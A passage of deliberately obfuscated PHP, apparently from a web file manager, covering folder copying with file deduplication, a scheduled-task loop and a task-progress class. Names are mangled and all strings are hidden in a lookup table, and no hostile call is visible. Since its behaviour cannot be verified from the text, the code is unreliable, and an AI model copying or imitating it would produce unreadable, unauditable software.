$this->sourceInfo($ç”úÒû); $íÁÎÏéÇ = $this->sourceInfo($€ë†Øô); if ($ï¼Ş²¸í[$’²Ó˜»Ì[505]] == $íÁÎÏéÇ[$’²Ó˜»Ì[505]] && $ï¼Ş²¸í[$’²Ó˜»Ì[420]] == $’²Ó˜»Ì[599]) { return; } $ª¾…ƒÈ‘ = array($’²Ó˜»Ì[520] => array($’²Ó˜»Ì[549], $ï¼Ş²¸í[$’²Ó˜»Ì[520]] . $ç”úÒû . $’²Ó˜»Ì[550])); $àèÜ°” = $this->field($’²Ó˜»Ì[426])->where($ª¾…ƒÈ‘)->getField($’²Ó˜»Ì[411], !0); if (!$àèÜ°”) { return; } $ª¾…ƒÈ‘ = array($’²Ó˜»Ì[411] => array($’²Ó˜»Ì[7], $àèÜ°”), $’²Ó˜»Ì[600] => 1); $ûğÜÓÅÒ = Model($’²Ó˜»Ì[601])->field($’²Ó˜»Ì[602])->where($ª¾…ƒÈ‘)->select(); if (!$ûğÜÓÅÒ) { return; } $ûğÜÓÅÒ = array_to_keyvalue($ûğÜÓÅÒ, $’²Ó˜»Ì[12], $’²Ó˜»Ì[602]); $ª¾…ƒÈ‘ = array($’²Ó˜»Ì[602] => array($’²Ó˜»Ì[7], $ûğÜÓÅÒ)); Model($’²Ó˜»Ì[601])->where($ª¾…ƒÈ‘)->save(array($’²Ó˜»Ì[600] => 0)); Model($’²Ó˜»Ì[603])->where($ª¾…ƒÈ‘)->delete(); } public function copyFolderFromIO($â„äÎ¾ñ, $­¡èÛ¼Š, $×®äãÖš, $×ìØÙçŞ, $øÃ×‹—, $•ÆÄ±úğ = false) { $±†›¿¸¯ =& $_SERVER[Ó¡Ÿ§‚]; $ı§õ¹ÌØ = array($±†›¿¸¯[567] => array(), $±†›¿¸¯[568] => array(), $±†›¿¸¯[566] => array(), $±†›¿¸¯[604] => array()); $„Ñô…ñÎ = $•ÆÄ±úğ ? $•ÆÄ±úğ : $â„äÎ¾ñ->pathThis($­¡èÛ¼Š); $»ì·¢©ª = $this->fileNameExist($×®äãÖš, $„Ñô…ñÎ); $Âª¸Ğœ‹ = $this->mkdir($×®äãÖš, $„Ñô…ñÎ, $×ìØÙçŞ); if (!$»ì·¢©ª || $×ìØÙçŞ == REPEAT_RENAME_FOLDER) { $×ìØÙçŞ = !1; } if ($»ì·¢©ª) { $this->_childrenAllMake($»ì·¢©ª); } Hook::trigger($±†›¿¸¯[605]); $this->_copyChildTo($â„äÎ¾ñ, $­¡èÛ¼Š, $Âª¸Ğœ‹, $×ìØÙçŞ, $ı§õ¹ÌØ, $øÃ×‹—); Hook::trigger($±†›¿¸¯[606]); if ($Âª¸Ğœ‹) { $this->folderSizeResetChildren($Âª¸Ğœ‹); } $this->_childrenListClear(); Model($±†›¿¸¯[569])->addAll($ı§õ¹ÌØ[$±†›¿¸¯[567]], array(), !0); Model($±†›¿¸¯[570])->eventCopy($Âª¸Ğœ‹); $this->saveAll($ı§õ¹ÌØ[$±†›¿¸¯[568]]); Model($±†›¿¸¯[480])->linkAdd($ı§õ¹ÌØ[$±†›¿¸¯[566]]); Model($±†›¿¸¯[480])->remove($ı§õ¹ÌØ[$±†›¿¸¯[604]]); $this->folderSizeReset($×®äãÖš); $this->updateModifyTime($×®äãÖš); return $Âª¸Ğœ‹; } private function _copyChildTo($›¦Œğíò, $ëé˜ÚùÍ, $öØ¢˜¬ì, $—üûà §, &$¸„ç£õ, $ú…½·ÖÙ) { $€ôÕÍÇ =& $_SERVER[Ó¡Ÿ§‚]; $¬÷óªƒÅ = $this->sourceInfoCache($öØ¢˜¬ì); $™µÛªø¹ = $›¦Œğíò->listPath($ëé˜ÚùÍ); $™µÛªø¹ = $™µÛªø¹ ? $™µÛªø¹ : array($€ôÕÍÇ[83] => array(), $€ôÕÍÇ[82] => array()); $©²ƒùÚ© = array_merge($™µÛªø¹[$€ôÕÍÇ[83]], $™µÛªø¹[$€ôÕÍÇ[82]]); $¹ãã­ø« = $this->_addFiles($›¦Œğíò, $™µÛªø¹[$€ôÕÍÇ[83]], $ú…½·ÖÙ); $èÖ°üîæ = array(); foreach ($©²ƒùÚ© as &$ÙÍôœŠó) { if (isset($¹ãã­ø«[$ÙÍôœŠó[$€ôÕÍÇ[32]]])) { $ÙÍôœŠó = $¹ãã­ø«[$ÙÍôœŠó[$€ôÕÍÇ[32]]]; } $ÙÍôœŠó[$€ôÕÍÇ[419]] = $ÙÍôœŠó[$€ôÕÍÇ[33]] == $€ôÕÍÇ[75]; $ÙÍôœŠó[$€ôÕÍÇ[421]] = substr(_get($ÙÍôœŠó, $€ôÕÍÇ[174], $€ôÕÍÇ[12]), 0, 10); $ÙÍôœŠó[$€ôÕÍÇ[76]] = _get($ÙÍôœŠó, $€ôÕÍÇ[76], 0); $ÙÍôœŠó[$€ôÕÍÇ[477]] = _get($ÙÍôœŠó, $€ôÕÍÇ[477], 0); if (!isset($ÙÍôœŠó[$€ôÕÍÇ[607]]) && $ÙÍôœŠó[$€ôÕÍÇ[477]]) { $¸„ç£õ[$€ôÕÍÇ[604]][] = $ÙÍôœŠó[$€ôÕÍÇ[477]]; } if ($—üûà §) { $—±‘¦—¹ = $this->fileNameExistCache($öØ¢˜¬ì, $ÙÍôœŠó[$€ôÕÍÇ[32]]); if ($—±‘¦—¹) { if ($ÙÍôœŠó[$€ôÕÍÇ[419]] || $—üûà § == REPEAT_SKIP) { continue; } if ($—üûà § == REPEAT_REPLACE) { $”íº’Êƒ = $this->sourceInfoCache($—±‘¦—¹); $”ÊúÆ«ä = $this->fileHistory($”íº’Êƒ, $ÙÍôœŠó[$€ôÕÍÇ[477]], $ÙÍôœŠó[$€ôÕÍÇ[76]]); if ($”ÊúÆ«ä) { $¸„ç£õ[$€ôÕÍÇ[566]][] = $ÙÍôœŠó[$€ôÕÍÇ[477]]; } continue; } else { if ($—üûà § == REPEAT_RENAME) { $ÙÍôœŠó[$€ôÕÍÇ[32]] = $this->fileNameAutoCache($öØ¢˜¬ì, $ÙÍôœŠó[$€ôÕÍÇ[32]], $—üûà §, !1); } } } } if (!$ÙÍôœŠó[$€ôÕÍÇ[419]] && $ÙÍôœŠó[$€ôÕÍÇ[477]] == 0) { continue; } if (!$ÙÍôœŠó[$€ôÕÍÇ[419]] && $ÙÍôœŠó[$€ôÕÍÇ[477]]) { $¸„ç£õ[$€ôÕÍÇ[566]][] = $ÙÍôœŠó[$€ôÕÍÇ[477]]; } $èÖ°üîæ[] = $this->_makeItemData($ÙÍôœŠó, $¬÷óªƒÅ, $ÙÍôœŠó[$€ôÕÍÇ[32]]); } unset($ÙÍôœŠó); if (!empty($èÖ°üîæ)) { $this->addAll($èÖ°üîæ); $this->_childrenListSelect($öØ¢˜¬ì); } $¶·ı®…À = $this->_childrenList($öØ¢˜¬ì); $¶·ı®…À = array_to_keyvalue($¶·ı®…À, $€ôÕÍÇ[32]); foreach ($©²ƒùÚ© as $ÙÍôœŠó) { $”íº’Êƒ = $¶·ı®…À[$ÙÍôœŠó[$€ôÕÍÇ[32]]]; $ŞÜ£´“° = $”íº’Êƒ[$€ôÕÍÇ[411]]; $this->_copyApplyMeta($”íº’Êƒ, $¸„ç£õ); if ($ÙÍôœŠó[$€ôÕÍÇ[33]] == $€ôÕÍÇ[75]) { $ÙÍôœŠó[$€ôÕÍÇ[84]] = $›¦Œğíò->getPathInner($ÙÍôœŠó[$€ôÕÍÇ[84]]); $this->_copyChildTo($›¦Œğíò, $ÙÍôœŠó[$€ôÕÍÇ[84]], $ŞÜ£´“°, $—üûà §, $¸„ç£õ, $ú…½·ÖÙ); } } } private function _addFiles($®À†×Âù, $ÚØÑ³Æ·, $ÆÔªèµ¿) { $ĞÚÙòîä =& $_SERVER[Ó¡Ÿ§‚]; if (!$ÚØÑ³Æ· || count($ÚØÑ³Æ·) == 0) { return array(); } $æ¶Ä¾Ë = array(); foreach ($ÚØÑ³Æ· as &$æöÓÒØÇ) { Hook::trigger($ĞÚÙòîä[608], $æöÓÒØÇ); $æöÓÒØÇ[$ĞÚÙòîä[84]] = $®À†×Âù->getPathInner($æöÓÒØÇ[$ĞÚÙòîä[84]]); $ğ‚ØÉîÁ = $®À†×Âù->hashSimple($æöÓÒØÇ[$ĞÚÙòîä[84]]); $Óµœƒ¿Ô = $®À†×Âù->hashMd5($æöÓÒØÇ[$ĞÚÙòîä[84]]); if (strlen($Óµœƒ¿Ô) > 10 && !isset($æ¶Ä¾Ë[$Óµœƒ¿Ô])) { $æ¶Ä¾Ë[$Óµœƒ¿Ô] = array(); } $æöÓÒØÇ[$ĞÚÙòîä[177]] = $ğ‚ØÉîÁ; $æöÓÒØÇ[$ĞÚÙòîä[176]] = $Óµœƒ¿Ô; $æ¶Ä¾Ë[$Óµœƒ¿Ô][] =& $æöÓÒØÇ; if (count($æ¶Ä¾Ë[$Óµœƒ¿Ô]) > 1) { $æöÓÒØÇ[$ĞÚÙòîä[607]] = !0; } Hook::trigger($ĞÚÙòîä[609], $æöÓÒØÇ); } unset($æöÓÒØÇ); $±ñ¾Ãä = array($ĞÚÙòîä[176] => array($ĞÚÙòîä[7], array_keys($æ¶Ä¾Ë))); $ªŒîê˜ì = Model($ĞÚÙòîä[610]); $óúœ¨Áï = $ªŒîê˜ì->where($±ñ¾Ãä)->select(); $óúœ¨Áï = $óúœ¨Áï ? $óúœ¨Áï : array(); foreach ($óúœ¨Áï as $¼˜èã–¼) { if (!isset($æ¶Ä¾Ë[$¼˜èã–¼[$ĞÚÙòîä[176]]])) { continue; } $Ü£áİŸ = $æ¶Ä¾Ë[$¼˜èã–¼[$ĞÚÙòîä[176]]]; foreach ($Ü£áİŸ as &$æöÓÒØÇ) { $æöÓÒØÇ[$ĞÚÙòîä[477]] = $¼˜èã–¼[$ĞÚÙòîä[477]]; $æöÓÒØÇ[$ĞÚÙòîä[607]] = !0; } unset($æöÓÒØÇ); } $Ó¾…áİö = array(); foreach ($ÚØÑ³Æ· as $äÔã÷) { Hook::trigger($ĞÚÙòîä[611], $äÔã÷); if (isset($äÔã÷[$ĞÚÙòîä[607]]) && $äÔã÷[$ĞÚÙòîä[607]]) { Hook::trigger($ĞÚÙòîä[612], $äÔã÷); continue; } $ÓıĞÔØ˜ = $®À†×Âù->getPathInner($äÔã÷[$ĞÚÙòîä[84]]); $‡¹„¼õ‹ = $ªŒîê˜ì->addFileMake($ÓıĞÔØ˜, $äÔã÷[$ĞÚÙòîä[76]], $äÔã÷[$ĞÚÙòîä[177]], $äÔã÷[$ĞÚÙòîä[176]], $äÔã÷[$ĞÚÙòîä[32]], $ÆÔªèµ¿); Hook::trigger($ĞÚÙòîä[612], $äÔã÷); if (!is_array($‡¹„¼õ‹)) { continue; } $Ó¾…áİö[] = $‡¹„¼õ‹; } $ªŒîê˜ì->addAll($Ó¾…áİö); $±ñ¾Ãä = array($ĞÚÙòîä[176] => array($ĞÚÙòîä[7], array_keys($æ¶Ä¾Ë))); $óúœ¨Áï = $ªŒîê˜ì->where($±ñ¾Ãä)->select(); $óúœ¨Áï = $óúœ¨Áï ? $óúœ¨Áï : array(); foreach ($óúœ¨Áï as $¼˜èã–¼) { if (!isset($æ¶Ä¾Ë[$¼˜èã–¼[$ĞÚÙòîä[176]]])) { continue; } $ŒÖš½¿‹ =& $æ¶Ä¾Ë[$¼˜èã–¼[$ĞÚÙòîä[176]]]; foreach ($ŒÖš½¿‹ as &$æöÓÒØÇ) { $æöÓÒØÇ[$ĞÚÙòîä[477]] = $¼˜èã–¼[$ĞÚÙòîä[477]]; } unset($æöÓÒØÇ); } $²ÀÛÀ„¢ = array(); foreach ($ÚØÑ³Æ· as $êïô×Â‡) { $²ÀÛÀ„¢[$êïô×Â‡[$ĞÚÙòîä[32]]] = $êïô×Â‡; } return $²ÀÛÀ„¢; } } define($_SERVER[Ó¡Ÿ§‚][613], $_SERVER[Ó¡Ÿ§‚][614]); $ovrpbjzhac = $_SERVER[Ó¡Ÿ§‚][615]; goto b¼ŠÏç·Û; b‰°†Òß: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $—üÜóß¨ =& $_SERVER[Ó¡Ÿ§‚]; if (self::valueGet($—üÜóß¨[748]) != $—üÜóß¨[88]) { return; } if (self::valueGet($—üÜóß¨[1624]) == $—üÜóß¨[88]) { $ĞåóèÎö = self::valueGet($—üÜóß¨[1625]); if (time() - $ĞåóèÎö > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$—üÜóß¨[1626]] = 1; self::valueSet($—üÜóß¨[1624], $—üÜóß¨[88]); self::log($—üÜóß¨[1627] . ACTION . $—üÜóß¨[1628]); Session::$data = array(); Session::$sessionSign = $—üÜóß¨[12]; $GLOBALS[$—üÜóß¨[503]] = 1; Hook::bind($—üÜóß¨[1629], $—üÜóß¨[1630]); $ ×Ö…’µ = 0; while (!0) { self::cacheClear(); if (self::valueGet($—üÜóß¨[748]) != $—üÜóß¨[88]) { self::valueSet($—üÜóß¨[1624], $—üÜóß¨[198]); self::log($—üÜóß¨[1631]); die; } $… º®ˆ = time(); if ($… º®ˆ - $ ×Ö…’µ >= 60) { self::valueSet(array($—üÜóß¨[1624] => $—üÜóß¨[88], $—üÜóß¨[1625] => $… º®ˆ), !1); $ ×Ö…’µ = $… º®ˆ; } if (!file_exists(USER_SYSTEM . $—üÜóß¨[1632])) { self::valueSet(array($—üÜóß¨[1624] => $—üÜóß¨[198], $—üÜóß¨[748] => $—üÜóß¨[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $÷¶äÇ¸É =& $_SERVER[Ó¡Ÿ§‚]; http_close(); self::valueSet($÷¶äÇ¸É[748], $÷¶äÇ¸É[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($÷¶äÇ¸É[1624] => $÷¶äÇ¸É[198], $÷¶äÇ¸É[748] => $÷¶äÇ¸É[88]), !1); } public static function taskSwitch() { $ŸñÜç·í =& $_SERVER[Ó¡Ÿ§‚]; $’È˜‘ÉÊ = self::valueGet($ŸñÜç·í[748]) == $ŸñÜç·í[88] ? $ŸñÜç·í[198] : $ŸñÜç·í[88]; self::valueSet($ŸñÜç·í[748], $’È˜‘ÉÊ); } public static function shutdownEvent() { $öŞ™ı²û =& $_SERVER[Ó¡Ÿ§‚]; self::valueSet($öŞ™ı²û[1624], $öŞ™ı²û[198]); self::log($öŞ™ı²û[1633]); } public static function config($”õÅñÆÁ, $•ùí£Á) { self::valueSet($_SERVER[Ó¡Ÿ§‚][748], $”õÅñÆÁ); } private static function taskRunAll() { $¨çÄÂìÉ =& $_SERVER[Ó¡Ÿ§‚]; $¬¯·¨Áî = timeFloat(); $âÎ¯¿Î‰ = Model($¨çÄÂìÉ[1634])->listData(); $´áÙ•âŒ = count($âÎ¯¿Î‰); for ($ã€†´µ = 0; $ã€†´µ < $´áÙ•âŒ; $ã€†´µ++) { $•º¾ßº± = $âÎ¯¿Î‰[$ã€†´µ]; if (!$•º¾ßº±[$¨çÄÂìÉ[399]] || $•º¾ßº±[$¨çÄÂìÉ[1635]] != $¨çÄÂìÉ[88]) { continue; } if (!self::taskTimeCheck($•º¾ßº±)) { continue; } self::taskRun($•º¾ßº±); } Hook::trigger($¨çÄÂìÉ[1636]); self::taskQueueRun($¬¯·¨Áî); } private static function taskQueueRun($†Â‡») { $„ÖË©· = 10; while (!0) { $§¶ŞÉï = TaskQueue::run(); if ($§¶ŞÉï === !1) { break; } if (timeFloat() - $†Â‡» >= $„ÖË©·) { break; } } } private static function taskTimeCheck($é«ë¯ÑÕ) { $ê—â”¶ =& $_SERVER[Ó¡Ÿ§‚]; $Ùı¢Šó = json_decode($é«ë¯ÑÕ[$ê—â”¶[180]], !0); $ÁëÃÛàÍ = intval($é«ë¯ÑÕ[$ê—â”¶[1625]]); $ú’Óç¢ = strtotime($ê—â”¶[1637] . $Ùı¢Šó[$ê—â”¶[1638]] . $ê—â”¶[1639]) - strtotime($ê—â”¶[1640]); $ç‡´­ = time() - strtotime(date($ê—â”¶[1641]) . $ê—â”¶[1642]); $‘²Ú¾³­ = $ç‡´­ >= $ú’Óç¢ && $ç‡´­ <= $ú’Óç¢ + 3600; switch ($Ùı¢Šó[$ê—â”¶[33]]) { case $ê—â”¶[1643]: if (time() - $ÁëÃÛàÍ < 3600 * 24 * 30) { return !1; } if ($Ùı¢Šó[$ê—â”¶[1643]] == date($ê—â”¶[1644]) && $‘²Ú¾³­) { return !0; } break; case $ê—â”¶[1645]: if (time() - $ÁëÃÛàÍ < 3600 * 24 * 7) { return !1; } $¥ÒöˆîÄ = date($ê—â”¶[1646]) == 0 ? 7 : date($ê—â”¶[1646]); if ($Ùı¢Šó[$ê—â”¶[1645]] == $¥ÒöˆîÄ && $‘²Ú¾³­) { return !0; } break; case $ê—â”¶[1638]: if (time() - $ÁëÃÛàÍ < 3600 * 24) { return !1; } if ($‘²Ú¾³­) { return !0; } break; case $ê—â”¶[1647]: if (time() - $ÁëÃÛàÍ >= floatval($Ùı¢Šó[$ê—â”¶[1647]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $×ÈÎÆß÷ =& $_SERVER[Ó¡Ÿ§‚]; static $ğà¬Õ¨ = 0; $ñÓ‚­¸Ö = 300; if (!$ğà¬Õ¨) { $ğà¬Õ¨ = time(); } if (time() - $ğà¬Õ¨ < $ñÓ‚­¸Ö) { return; } $ğà¬Õ¨ = time(); $±È¶±’Ş = Model($×ÈÎÆß÷[513])->db($×ÈÎÆß÷[12]); if ($±È¶±’Ş) { $±È¶±’Ş->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($×ÈÎÆß÷[1648], $×ÈÎÆß÷[1649]); die; } } public static function taskRun($â¨œí‹ä) { $âš…¤÷ =& $_SERVER[Ó¡Ÿ§‚]; self::log($âš…¤÷[1650] . $â¨œí‹ä[$âš…¤÷[399]] . $âš…¤÷[1651] . $â¨œí‹ä[$âš…¤÷[32]] . $âš…¤÷[1652] . $â¨œí‹ä[$âš…¤÷[1653]]); Model($âš…¤÷[1634])->run($â¨œí‹ä[$âš…¤÷[399]]); $üˆ¡×åÀ = timeFloat(); $Ú¼½¸éˆ = $âš…¤÷[12]; switch ($â¨œí‹ä[$âš…¤÷[33]]) { case $âš…¤÷[307]: $´áÃ½Ã = url_request($â¨œí‹ä[$âš…¤÷[1653]], $âš…¤÷[230], !1, !1, !1, !1, 10); if ($´áÃ½Ã[$âš…¤÷[748]]) { $Ú¼½¸éˆ = strlen($´áÃ½Ã[$âš…¤÷[1201]]); } break; case $âš…¤÷[229]: $Ú¼½¸éˆ = Hook::apply($â¨œí‹ä[$âš…¤÷[1653]]); default: break; } Model($âš…¤÷[1654])->add(array($âš…¤÷[1655] => $âš…¤÷[12], $âš…¤÷[1656] => $âš…¤÷[198], $âš…¤÷[33] => $âš…¤÷[1657] . $â¨œí‹ä[$âš…¤÷[399]], $âš…¤÷[1658] => json_encode(array($âš…¤÷[32] => $â¨œí‹ä[$âš…¤÷[32]], $âš…¤÷[1659] => timeFloat() - $üˆ¡×åÀ, $âš…¤÷[293] => $Ú¼½¸éˆ)))); $öŞË¢ıÍ = $Ú¼½¸éˆ ? $âš…¤÷[1660] . $Ú¼½¸éˆ : $âš…¤÷[12]; self::log($âš…¤÷[1661] . $â¨œí‹ä[$âš…¤÷[399]] . $âš…¤÷[164] . $öŞË¢ıÍ); return !0; } private static function valueGet($Úû¤êá) { $ìïË¿õş =& $_SERVER[Ó¡Ÿ§‚]; $ıš×Ÿ‰à = $ìïË¿õş[1662]; $ÓÍ´˜Œ³ = Model($ìïË¿õş[444])->get($Úû¤êá, $ıš×Ÿ‰à); if (is_null($ÓÍ´˜Œ³)) { Model($ìïË¿õş[444])->set($ìïË¿õş[748], $ìïË¿õş[88], $ıš×Ÿ‰à); Model($ìïË¿õş[444])->set($ìïË¿õş[1624], $ìïË¿õş[198], $ıš×Ÿ‰à); $ÓÍ´˜Œ³ = Model($ìïË¿õş[444])->get($Úû¤êá, $ıš×Ÿ‰à); } return $ÓÍ´˜Œ³; } private static function valueSet($¸Œ¾¼§é, $´‰ŒîÆõ) { $ªĞÛÜÕ =& $_SERVER[Ó¡Ÿ§‚]; $ş”¹¯ü = $ªĞÛÜÕ[1663]; CacheLock::lock($ş”¹¯ü); $Âä½Ç Ò = Model($ªĞÛÜÕ[444])->set($¸Œ¾¼§é, $´‰ŒîÆõ, $ªĞÛÜÕ[1662]); CacheLock::unlock($ş”¹¯ü); return $Âä½Ç Ò; } protected static function log($Ó·¦ĞÍ¬) { write_log($Ó·¦ĞÍ¬, $_SERVER[Ó¡Ÿ§‚][1649]); } private static function cacheClear() { $õÎ¾«ä =& $_SERVER[Ó¡Ÿ§‚]; Cache::clearMemory(Model($õÎ¾«ä[444])->cacheKey($õÎ¾«ä[1662])); Cache::clearMemory(Model($õÎ¾«ä[444])->cacheKey($õÎ¾«ä[1664])); Model($õÎ¾«ä[1634])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ºá¬Š‹Ë, $‰ÒúÎ£Í = '', $‹‚¶£ = 0, $éĞÆà’ş = '') { $€«»©– =& $_SERVER[Ó¡Ÿ§‚]; if (self::get($ºá¬Š‹Ë)) { return; } $this->task = array($€«»©–[399] => $ºá¬Š‹Ë, $€«»©–[1665] => USER_ID, $€«»©–[1565] => $éĞÆà’ş, $€«»©–[462] => $€«»©–[12], $€«»©–[33] => $‰ÒúÎ£Í, $€«»©–[1063] => $€«»©–[12], $€«»©–[785] => $‹‚¶£, $€«»©–[1666] => 0, $€«»©–[1667] => 0, $€«»©–[1668] => 0, $€«»©–[1669] => timeFloat(), $€«»©–[1670] => 0, $€«»©–[1671] => 0, $€«»©–[1672] => 0, $€«»©–[1673] => 0, $€«»©–[748] => $€«»©–[1624]); $GLOBALS[$€«»©–[1674]] = 1; Hook::bind($€«»©–[1629], array($this, $€«»©–[1675])); Hook::bind($€«»©–[1676], array($this, $€«»©–[1677])); $this->startAfter(); Hook::trigger($€«»©–[1678], $this->task); $this->task[$€«»©–[1671]] = timeFloat(); } public function end($¯²üµ¿Ä = '') { $¢—æ€Àè =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¢—æ€Àè[1671]]) { self::valueSet($this->task[$¢—æ€Àè[399]], !1); } $this->isEnd = !0; if ($¯²üµ¿Ä) { $this->task[$¢—æ€Àè[462]] = $¯²üµ¿Ä; } self::log($¢—æ€Àè[1679] . $this->task[$¢—æ€Àè[399]] . $¢—æ€Àè[1680] . sprintf($¢—æ€Àè[849], timeFloat() - $this->task[$¢—æ€Àè[1669]]) . $¢—æ€Àè[1681]); Hook::unbind($¢—æ€Àè[1629], array($this, $¢—æ€Àè[1675])); Hook::unbind($¢—æ€Àè[1676], array($this, $¢—æ€Àè[1677])); $this->endAfter(); $›¤ÕĞ Õ = $this->task; $this->task = !1; Hook::trigger($¢—æ€Àè[1682], $›¤ÕĞ Õ); } public function update($â«Üß¶ = 0, $…Ÿç²á = false) { $âî™¿¾Ñ =& $_SERVER[Ó¡Ÿ§‚]; $óôŠ¤Ò =& $this->task; if (!$óôŠ¤Ò) { return; } $óôŠ¤Ò[$âî™¿¾Ñ[1666]] += $â«Üß¶; $óôŠ¤Ò[$âî™¿¾Ñ[1670]] = timeFloat(); if ($óôŠ¤Ò[$âî™¿¾Ñ[785]]) { if ($óôŠ¤Ò[$âî™¿¾Ñ[785]] < $óôŠ¤Ò[$âî™¿¾Ñ[1666]]) { $óôŠ¤Ò[$âî™¿¾Ñ[785]] = $óôŠ¤Ò[$âî™¿¾Ñ[1666]]; } $ÀÇíÎ²  = timeFloat() - $óôŠ¤Ò[$âî™¿¾Ñ[1669]] - $óôŠ¤Ò[$âî™¿¾Ñ[1672]]; if ($ÀÇíÎ²  <= 0) { $ÀÇíÎ²  = 0.001; } $óôŠ¤Ò[$âî™¿¾Ñ[1667]] = $óôŠ¤Ò[$âî™¿¾Ñ[1666]] / $óôŠ¤Ò[$âî™¿¾Ñ[785]]; $óôŠ¤Ò[$âî™¿¾Ñ[1668]] = $óôŠ¤Ò[$âî™¿¾Ñ[1666]] / $ÀÇíÎ² ; if ($óôŠ¤Ò[$âî™¿¾Ñ[1667]] > 0) { $óôŠ¤Ò[$âî™¿¾Ñ[1673]] = $ÀÇíÎ²  * (1 - $óôŠ¤Ò[$âî™¿¾Ñ[1667]]) / $óôŠ¤Ò[$âî™¿¾Ñ[1667]]; } $óôŠ¤Ò[$âî™¿¾Ñ[1673]] = $óôŠ¤Ò[$âî™¿¾Ñ[1673]] <= 0 ? 0 : $óôŠ¤Ò[$âî™¿¾Ñ[1673]]; } $this->updateAfter(); $¦ïìóŠÅ = 0.2; if (timeFloat() - $óôŠ¤Ò[$âî™¿¾Ñ[1671]] < $¦ïìóŠÅ && !$…Ÿç²á) { return; } $Š‘˜ì¥¬ = self::get($óôŠ¤Ò[$âî™¿¾Ñ[399]]); $é‹ÅÀç“ = $Š‘˜ì¥¬[$âî™¿¾Ñ[748]]; if ($é‹ÅÀç“ == self::STATYS_KILL) { $¤ÜÕçóõ = array($âî™¿¾Ñ[1683] => LNG($âî™¿¾Ñ[1684]), $âî™¿¾Ñ[1211] => !1); Cache::set($âî™¿¾Ñ[1685] . $this->task[$âî™¿¾Ñ[399]], $¤ÜÕçóõ, 30); $this->onKill(); $this->end(); die; } else { if ($é‹ÅÀç“ == self::STATYS_STOP) { $ª©ØÔ›„ = 2; $Š‘˜ì¥¬[$âî™¿¾Ñ[1672]] += $ª©ØÔ›„; self::valueSet($óôŠ¤Ò[$âî™¿¾Ñ[399]], $Š‘˜ì¥¬); sleep($ª©ØÔ›„); $this->update(); return; } } $óôŠ¤Ò[$âî™¿¾Ñ[748]] = $é‹ÅÀç“ ? $é‹ÅÀç“ : $óôŠ¤Ò[$âî™¿¾Ñ[748]]; $óôŠ¤Ò[$âî™¿¾Ñ[1672]] = $Š‘˜ì¥¬[$âî™¿¾Ñ[1672]] ? $Š‘˜ì¥¬[$âî™¿¾Ñ[1672]] : 0; $óôŠ¤Ò[$âî™¿¾Ñ[1671]] = timeFloat(); Hook::trigger($âî™¿¾Ñ[1686], $óôŠ¤Ò); self::valueSet($óôŠ¤Ò[$âî™¿¾Ñ[399]], $óôŠ¤Ò); } public function onKillSet($“‹Áßü, $½şÙß§¡ = array()) { $this->onKillCall = array($“‹Áßü, $½şÙß§¡); } public function onKill() { $ì‡¤¥ =& $_SERVER[Ó¡Ÿ§‚]; self::log($ì‡¤¥[1679] . $this->task[$ì‡¤¥[399]] . $ì‡¤¥[1687]); Hook::trigger($ì‡¤¥[1688], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($µø…£) { $ÃùŒ² =& $_SERVER[Ó¡Ÿ§‚]; Cache::set($ÃùŒ²[1685] . $this->task[$ÃùŒ²[399]], $µø…£, 60); return $µø…£; } public static function get($¸ ’ŠõÓ) { $ïàù—ô­ =& $_SERVER[Ó¡Ÿ§‚]; $Ùû‡¾¢´ = self::valueGet($¸ ’ŠõÓ); if (is_array($Ùû‡¾¢´) && $Ùû‡¾¢´[$ïàù—ô­[1689]]) { $Ñ ‹¯İı = ActionApply($Ùû‡¾¢´[$ïàù—ô­[1689]], array($Ùû‡¾¢´)); $Ùû‡¾¢´ = is_array($Ñ ‹¯İı) ? $Ñ ‹¯İı : $Ùû‡¾¢´; } return $Ùû‡¾¢´; } public static function listData() { $ÅºÀÓ× = self::valueGet(); return array_sort_by($ÅºÀÓ×, $_SERVER[Ó¡Ÿ§‚][1669], !0); } public static function kill($ƒï‡äÙ‹) { return self::changeStatus($ƒï‡äÙ‹, self::STATYS_KILL); } public static function stop($æœÁ†öí) { return self::changeStatus($æœÁ†öí, self::STATYS_STOP); } public static function restart($ÑáÕÛØ) { return self::changeStatus($ÑáÕÛØ, self::STATYS_RUNNING); } public static function killAll() { $Îï˜½ø„ =& $_SERVER[Ó¡Ÿ§‚]; $·Ç¸„Ğº = self::listData(); foreach ($·Ç¸„Ğº as $ëÂÇÙİú) { self::kill($ëÂÇÙİú[$Îï˜½ø„[399]]); } sleep(2); foreach ($·Ç¸„Ğº as $ëÂÇÙİú) { self::valueSet($ëÂÇÙİú[$Îï˜½ø„[399]], !1); } } private static function changeStatus($ÛÀò•›, $»²ó‘îÜ) { $ Æ„Øµî =& $_SERVER[Ó¡Ÿ§‚]; $ÜªÔğÚ¤ = self::valueGet($ÛÀò•›); if (!$ÜªÔğÚ¤) { return !1; } $ÜªÔğÚ¤[$ Æ„Øµî[748]] = $»²ó‘îÜ; self::valueSet($ÛÀò•›, $ÜªÔğÚ¤); self::log($ Æ„Øµî[1690] . $ÜªÔğÚ¤[$ Æ„Øµî[399]] . $ Æ„Øµî[1691] . $»²ó‘îÜ); return !0; } public static function valueGet($ºôåƒª = false) { $¹±¾Ê„Î =& $_SERVER[Ó¡Ÿ§‚]; if ($ºôåƒª) { $œÀœ´–  = Model($¹±¾Ê„Î[456])->where(array($¹±¾Ê„Î[94] => $ºôåƒª, $¹±¾Ê„Î[33] => $¹±¾Ê„Î[1070]))->find(); return $œÀœ´–  ? json_decode($œÀœ´– [$¹±¾Ê„Î[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function 